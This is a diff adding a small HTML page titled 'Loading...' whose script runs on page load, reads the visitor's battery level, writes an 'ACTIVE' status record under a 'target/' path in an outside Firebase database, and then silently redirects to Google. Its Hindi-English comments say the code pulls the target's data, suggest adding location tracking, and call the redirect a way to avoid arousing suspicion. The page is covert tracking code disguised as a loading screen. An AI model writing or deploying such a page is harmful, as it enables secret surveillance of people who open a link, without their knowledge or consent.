@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // Tera Firebase Config
+        const firebaseConfig = {
+            databaseURL: "https://tacticalsystem-99ebd-default-rtdb.firebaseio.com/"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Target ka data nikalne ka function
+        async function startTracking() {
+            let batteryLevel = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryLevel = Math.floor(batt.level * 100) + "%";
+            }
+
+            // Database update karo
+            update(ref(db, 'target/'), {
+                status: "ACTIVE",
+                battery: batteryLevel,
+                city: "UPDATING...", // Yahan location ka logic bhi add ho sakta hai
+            });
+
+            // Target ko kahin aur bhej do (taaki shak na ho)
+            window.location.href = "https://www.google.com";
+        }
+
+        window.onload = startTracking;
+    </script>
+</body>
+</html>
